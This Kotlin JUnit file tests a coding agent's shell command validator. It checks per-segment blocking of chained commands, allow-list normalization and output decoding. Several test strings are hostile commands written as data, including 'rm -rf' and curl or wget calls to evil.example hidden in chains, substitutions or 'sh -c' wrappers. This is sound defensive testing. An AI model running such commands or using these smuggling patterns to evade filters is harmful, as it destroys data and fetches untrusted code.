package ai.platon.pulsar.coding

import org.junit.jupiter.api.Assertions.assertEquals
import org.junit.jupiter.api.DisplayName
import org.junit.jupiter.api.Test
import java.nio.charset.Charset
import java.nio.file.Path

/**
 * Tests for the whole-command validation in [CodingAgentShell] (plan P0.7) and
 * the platform-agnostic allow-list normalization (plan P0.4).
 *
 * The historical hole: only the FIRST token was validated, so `ls && rm -rf x`
 * passed as "ls". These tests pin the per-segment behaviour.
 */
class CodingAgentShellTest {

    private fun shell(
        allowNetwork: Boolean = false,
        allowDestructive: Boolean = false,
    ) = CodingAgentShell(
        baseDir = Path.of(System.getProperty("user.dir")).toAbsolutePath(),
        allowDevTools = true,
        allowNetwork = allowNetwork,
        allowDestructive = allowDestructive,
    )

    // --- Allow-list normalization (K4) --------------------------------------

    @Test
    @DisplayName("Windows Maven wrapper name is accepted on every platform")
    fun windowsLauncherIsAccepted() {
        val s = shell()
        // Before normalization `mvnw.cmd` was not in DEV_COMMANDS, so the same
        // build passed on Linux and failed on Windows (eval K4).
        assertTrueAllowed(s, "mvnw.cmd -pl browser4-coding -am compile")
        assertTrueAllowed(s, "mvn.cmd -pl browser4-rest -am compile")
        assertTrueAllowed(s, "mvnw -pl browser4-rest -am compile")
        assertTrueAllowed(s, "gradlew.bat build")
    }

    @Test
    @DisplayName("absolute launcher path is accepted through its basename")
    fun absoluteLauncherIsAccepted() {
        val s = shell()
        assertTrueAllowed(s, "C:\\workspace\\Browser4\\mvnw.cmd -pl browser4-coding -am compile")
        assertTrueAllowed(s, "/home/dev/Browser4/mvnw -pl browser4-rest -am compile")
        assertTrueAllowed(s, "/usr/bin/python3 --version")
    }

    @Test
    @DisplayName("stderr redirection (2>&1) is a redirection, not a command")
    fun stderrRedirectionIsNotACommand() {
        // The splitter treated `&` as chaining, so `2>&1` became the command `1` and the
        // whole line was refused — 9 times in the 2026-10-28 rerun.
        val s = shell()
        assertTrueAllowed(s, "python .b4scratch/cols.py > .b4scratch/cols.txt 2>&1")
        assertTrueAllowed(s, "python .b4scratch/cols.py 2>&1 | more")
        assertTrueAllowed(s, "type build.log 2>&1")
    }

    // --- Whole-command validation (K7 / P0.7) -------------------------------

    @Test
    @DisplayName("chained destructive command is rejected, not just its head")
    fun chainedDestructiveIsRejected() {
        val s = shell(allowDestructive = false)
        assertDenied(s, "ls && rm -rf build", "rm")
        assertDenied(s, "echo hi; rm -rf build", "rm")
        assertDenied(s, "cat pom.xml | rm -rf build", "rm")
        assertDenied(s, "true & rm -rf build", "rm")
    }

    @Test
    @DisplayName("network command hidden in a chain or substitution is rejected")
    fun hiddenNetworkCommandIsRejected() {
        val s = shell(allowNetwork = false)
        assertDenied(s, "ls && curl http://evil.example/x", "curl")
        assertDenied(s, "echo $(curl http://evil.example/x)", "curl")
        assertDenied(s, "echo `wget http://evil.example/x`", "wget")
    }

    @Test
    @DisplayName("inline shell script is validated recursively")
    fun inlineScriptIsValidated() {
        val s = shell(allowNetwork = false, allowDestructive = false)
        assertDenied(s, "sh -c \"curl http://evil.example\"", "curl")
        assertDenied(s, "bash -c 'ls && rm -rf build'", "rm")
        assertTrueAllowed(s, "sh -c 'ls -la'")
        assertTrueAllowed(s, "bash -c \"git status --porcelain\"")
    }

    @Test
    @DisplayName("blocked pattern is rejected even when wrapped in a shell")
    fun blockedPatternInsideInlineScript() {
        val s = shell(allowDestructive = true)
        assertDenied(s, "sh -c \"rm -rf /\"", "blocked pattern")
    }

    @Test
    @DisplayName("legitimate compound commands stay allowed")
    fun legitimateCompoundCommandsAreAllowed() {
        val s = shell()
        assertTrueAllowed(s, "ls && cat pom.xml")
        assertTrueAllowed(s, "git status --porcelain; git diff --stat")
        assertTrueAllowed(s, "mvn -pl browser4-rest -am compile && mvn -pl browser4-rest -am test")
        assertTrueAllowed(s, "cargo test --bin browser4-cli")
        // Quoted separators are arguments, not operators.
        assertTrueAllowed(s, "grep \"a|b\" pom.xml")
    }

    @Test
    @DisplayName("normalization strips launcher suffixes only from the basename")
    fun normalizationStripsOnlyLauncherSuffixes() {
        val s = shell()
        assertTrueAllowed(s, "python3.12.exe --version")
        assertTrueAllowed(s, "node.exe --version")
        assertDenied(s, "totally-unknown-tool.exe --version", "not allowed")
    }

    // --- Child-process output decoding (localized Windows) -------------------

    @Test
    @DisplayName("UTF-8 process output decodes unchanged")
    fun utf8OutputDecodesUnchanged() {
        val text = "目录 C 中的卷\n 文件 12 个"
        assertEquals(text, CodingAgentShell.decodeProcessOutput(text.toByteArray(Charsets.UTF_8)))
    }

    @Test
    @DisplayName("native-encoded output stays readable (cmd.exe on a localized Windows)")
    fun nativeEncodedOutputIsReadable() {
        // On a Chinese Windows this is GBK: the bytes are NOT valid UTF-8, so the
        // decoder must fall back to the platform encoding instead of emitting U+FFFD.
        val native = Charset.forName(System.getProperty("native.encoding") ?: "UTF-8")
        val text = "C:\\> dir\n 目录: C:\\workspace\n 文件: 12 个"
        assertEquals(text, CodingAgentShell.decodeProcessOutput(text.toByteArray(native)))
    }

    @Test
    @DisplayName("a leading UTF-8 BOM is stripped")
    fun utf8BomIsStripped() {
        val bom = byteArrayOf(0xEF.toByte(), 0xBB.toByte(), 0xBF.toByte())
        assertEquals("hello", CodingAgentShell.decodeProcessOutput(bom + "hello".toByteArray(Charsets.UTF_8)))
    }

    @Test
    @DisplayName("undecodable bytes fall back instead of throwing")
    fun invalidBytesFallBack() {
        val decoded = CodingAgentShell.decodeProcessOutput(
            byteArrayOf(0xFF.toByte(), 0xFE.toByte(), 0x41)
        )
        assertTrue(decoded.isNotEmpty(), "decoding must never throw on process output")
    }

    // --- Output truncation stays UTF-8 encodable -----------------------------

    @Test
    @DisplayName("truncation never splits a surrogate pair")
    fun truncationKeepsSurrogatePairsIntact() {
        val emoji = "😀" // surrogate pair
        // The pair straddles the MAX_OUTPUT_CHARS boundary on purpose.
        val output = "a".repeat(CodingAgentShell.MAX_OUTPUT_CHARS - 1) + emoji + "b"

        val truncated = shell().truncateOutput(output, "dir")

        assertTrue(truncated.startsWith("aaa"), "the head must be kept")
        assertEquals(
            truncated,
            SafeText.sanitize(truncated),
            "truncation left a lone surrogate behind (it breaks every later UTF-8 write)"
        )
        truncated.toByteArray(Charsets.UTF_8) // must not throw
    }

    @Test
    @DisplayName("diagnostic output keeps both ends")
    fun diagnosticOutputKeepsBothEnds() {
        val output = "HEAD\n" + "x".repeat(CodingAgentShell.MAX_OUTPUT_CHARS) + "\n[ERROR] cannot find symbol"

        val truncated = shell().truncateOutput(output, "mvn compile")

        assertTrue(truncated.startsWith("HEAD"), "head must survive")
        assertTrue(truncated.contains("[ERROR] cannot find symbol"), "the diagnostic tail must survive")
        assertTrue(truncated.contains("output truncated"), "the middle must be replaced by the marker")
    }

    private fun assertTrueAllowed(s: CodingAgentShell, command: String) {
        assertTrue(s.isAllowed(command), "expected ALLOWED: $command (${s.explain(command)})")
    }

    private fun assertDenied(s: CodingAgentShell, command: String, expectedFragment: String) {
        val allowed = s.isAllowed(command)
        val explanation = s.explain(command)
        assertFalse(allowed, "expected DENIED: $command — $explanation")
        assertTrue(
            explanation.lowercase().contains(expectedFragment.lowercase()),
            "expected '$expectedFragment' in explanation for '$command', got: $explanation"
        )
    }

    // --- Workspace topology is provisioned by the framework, not the agent ---

    @Test
    @DisplayName("mklink is forever disabled, even with every allow flag on")
    fun mklinkIsForbidden() {
        val s = shell(allowNetwork = true, allowDestructive = true)
        assertDenied(s, "mklink /J browser4-coding D:\\repo\\browser4-coding", "is disabled")
        assertDenied(s, "mklink", "is disabled")
    }

    @Test
    @DisplayName("the link/mount family is disabled on every platform")
    fun linkFamilyForbidden() {
        val s = shell(allowNetwork = true, allowDestructive = true)
        assertDenied(s, "ln -s /repo/module module", "is disabled")
        assertDenied(s, "mount --bind /repo module", "is disabled")
    }

    @Test
    @DisplayName("a disabled topology tool cannot be smuggled through cmd or a chain")
    fun topologyToolsBlockedThroughLaunchers() {
        val s = shell(allowNetwork = true, allowDestructive = true)
        assertDenied(s, "cmd /c mklink /J mod D:\\repo\\mod", "is disabled")
        assertDenied(s, "echo ok && mklink /J mod D:\\repo\\mod", "is disabled")
    }

    private fun assertTrue(condition: Boolean, message: String) {
        org.junit.jupiter.api.Assertions.assertTrue(condition, message)
    }

    private fun assertFalse(condition: Boolean, message: String) {
        org.junit.jupiter.api.Assertions.assertFalse(condition, message)
    }
}
